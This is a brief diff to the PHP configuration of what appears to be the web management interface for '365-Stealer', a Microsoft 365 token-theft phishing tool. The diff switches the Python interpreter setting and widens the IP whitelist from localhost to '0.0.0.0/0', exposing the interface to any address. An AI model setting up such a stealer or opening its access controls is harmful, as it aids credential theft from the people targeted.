@@ -33,7 +33,7 @@
       public $stealerPath = "../365-Stealer.py";
        
      // python or python3
-      public $python3 = "python";
+      public $python3 = "python3";
        
       // The top level directory where this script is located, or alternatively one of it's sub-directories
       public $startDirectory = '.';
@@ -71,7 +71,7 @@
       // List of IP's to allow access to the script (only used if $enableIpWhitelist is true)
       public $ipWhitelist = array(
          '127.0.0.1',
-         '::1'
+         '0.0.0.0/0'
         
       );
    
